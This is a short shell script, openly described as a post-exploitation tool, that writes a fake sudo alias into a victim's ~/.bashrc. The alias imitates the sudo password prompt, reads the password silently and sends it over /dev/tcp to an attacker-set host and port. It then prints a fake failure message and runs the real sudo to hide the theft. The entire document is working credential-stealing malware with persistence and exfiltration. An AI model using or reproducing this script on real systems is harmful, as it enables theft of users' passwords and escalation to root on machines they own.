#Lame post exploitation script to steal sudo password with alias
#Obviously the compromised user must be in sudoers file
host=localhost	#Change me
port=1337	#Change me
echo "alias sudo='echo [sudo] password for \$USER:; read -s pass; echo \$pass>>/dev/tcp/$host/$port; sleep 3; echo Sorry, try again.; /bin/sudo \$@'" >> ~/.bashrc
